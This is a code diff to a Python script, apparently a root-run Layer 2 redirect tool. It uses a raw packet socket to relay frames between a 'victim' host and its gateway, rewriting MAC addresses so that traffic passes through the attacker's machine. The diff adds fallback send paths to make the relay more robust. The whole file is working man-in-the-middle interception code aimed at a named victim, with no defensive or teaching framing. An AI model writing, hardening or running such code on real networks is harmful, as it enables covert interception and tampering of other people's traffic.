@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
-# fast_l2_redirect_optimized.py
+# fast_l2_redirect_fixed.py
+# Optimized L2 redirect with robust send fallbacks.
+# Keeps: def main(IFACE, VICTIM, GATEWAY)
+
 import os
 import sys
 import socket
@@ -10,10 +13,10 @@ from fcntl import ioctl
 # Constants
 ETH_P_ALL = 0x0003
 SIOCGIFHWADDR = 0x8927
-SIOCGIFINDEX  = 0x8933
+SIOCGIFINDEX = 0x8933
 MAX_FRAME = 65536
 
-# load settings (keeps existing behavior)
+# load settings (preserve original behavior)
 settings = {}
 if os.path.exists("puller.settings"):
     with open("puller.settings", "r") as f:
@@ -24,7 +27,6 @@ if os.path.exists("puller.settings"):
 
 def if_hwaddr(ifname, ioctl_sock=None):
     """Return 6-byte MAC as bytes."""
-    # reuse ioctl socket if provided
     s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         req = struct.pack('256s', ifname[:15].encode())
@@ -55,7 +57,6 @@ def resolve_mac_ip(iface, ip):
         text = out.decode(errors="ignore")
     except Exception:
         return None
-    # scan for MAC in output quickly
     for token in text.split():
         if token.count(':') == 5:
             try:
@@ -77,7 +78,7 @@ def main(IFACE, VICTIM, GATEWAY):
         print("run as root")
         sys.exit(1)
 
-    # Resolve MACs once
+    # Resolve MACs once (or fail fast)
     victim_mac = resolve_mac_ip(IFACE, VICTIM)
     gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
     if not victim_mac or not gateway_mac:
@@ -94,7 +95,6 @@ def main(IFACE, VICTIM, GATEWAY):
 
     # prepare raw AF_PACKET socket
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
-    # bigger buffers
     s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
     s.bind((IFACE, 0))
@@ -108,9 +108,7 @@ def main(IFACE, VICTIM, GATEWAY):
     v_mac = victim_mac
     g_mac = gateway_mac
     a_mac = attacker_mac
-    a_mac_bytes = a_mac  # alias
 
-    # quick printable
     def mac_to_str(b):
         return ':'.join(f"{x:02x}" for x in b)
 
@@ -119,13 +117,13 @@ def main(IFACE, VICTIM, GATEWAY):
     print("gateway mac:", mac_to_str(g_mac))
     print("starting loop...")
 
-    # localize functions/vars for speed
+    # localize for speed
     recvmsg_into = s.recvmsg_into
-    send = s.send
+    send_func = s.send
+    sendto_func = s.sendto
     v_mac_local = v_mac
     g_mac_local = g_mac
-    a_mac_local = a_mac_bytes
-    MAX_READ = MAX_FRAME
+    a_mac_local = a_mac
 
     try:
         while True:
@@ -141,25 +139,40 @@ def main(IFACE, VICTIM, GATEWAY):
             if src == a_mac_local:
                 continue
 
-            # Decide direction and prepare send buffer without allocating new bytearray
+            # Victim -> Gateway
             if src == v_mac_local:
-                # victim -> gateway: set dst=g_mac, src=attacker
-                # copy header (first 14 bytes) and payload
-                # write dst and src quickly into send buffer, then copy payload
                 send_mv[0:6] = g_mac_local
                 send_mv[6:12] = a_mac_local
-                # copy remaining header bytes (ethertype etc) and payload
-                send_mv[12:nbytes] = frame[12:nbytes]   # copies all bytes from 12..nbytes-1
-                # send memoryview slice (no new allocation)
-                send(send_mv[:nbytes])
+                send_mv[12:nbytes] = frame[12:nbytes]
+                # robust send: try zero-copy memoryview first, then bytes fallback, then sendto fallback
+                try:
+                    send_func(send_mv[:nbytes])
+                except (TypeError, OSError):
+                    try:
+                        send_func(bytes(send_mv[:nbytes]))
+                    except Exception:
+                        try:
+                            sendto_func(bytes(send_mv[:nbytes]), (IFACE, 0))
+                        except Exception as e:
+                            # minimal debug to stderr
+                            print("send failed:", e, file=sys.stderr)
+
+            # Gateway -> Victim
             elif src == g_mac_local:
-                # gateway -> victim
                 send_mv[0:6] = v_mac_local
                 send_mv[6:12] = a_mac_local
                 send_mv[12:nbytes] = frame[12:nbytes]
-                send(send_mv[:nbytes])
+                try:
+                    send_func(send_mv[:nbytes])
+                except (TypeError, OSError):
+                    try:
+                        send_func(bytes(send_mv[:nbytes]))
+                    except Exception:
+                        try:
+                            sendto_func(bytes(send_mv[:nbytes]), (IFACE, 0))
+                        except Exception as e:
+                            print("send failed:", e, file=sys.stderr)
             else:
-                # unrelated frame; skip
                 continue
 
     except KeyboardInterrupt:
@@ -168,7 +181,7 @@ def main(IFACE, VICTIM, GATEWAY):
         s.close()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Fast L2 redirect (optimized). Requires root.")
+    parser = argparse.ArgumentParser(description="Fast L2 redirect (fixed). Requires root.")
     parser.add_argument("iface", help="interface name (e.g. eth0)")
     parser.add_argument("victim", help="victim IP (used to resolve MAC via 'ip neigh')")
     parser.add_argument("gateway", help="gateway IP (used to resolve MAC via 'ip neigh')")
@@ -186,9 +199,7 @@ if __name__ == "__main__":
     else:
         gateway_bytes = None
 
-    # If user passed MACs, we need to patch resolve_mac_ip to return them.
     if victim_bytes and gateway_bytes:
-        # call main with provided bytes by temporarily wrapping resolve_mac_ip
         _resolve = resolve_mac_ip
         def _tmp_resolve(iface, ip):
             if ip == args.victim:
@@ -196,6 +207,6 @@ if __name__ == "__main__":
             if ip == args.gateway:
                 return gateway_bytes
             return _resolve(iface, ip)
-        resolve_mac_ip = _tmp_resolve  # monkey patch for main usage
+        resolve_mac_ip = _tmp_resolve
 
     main(args.iface, args.victim, args.gateway)
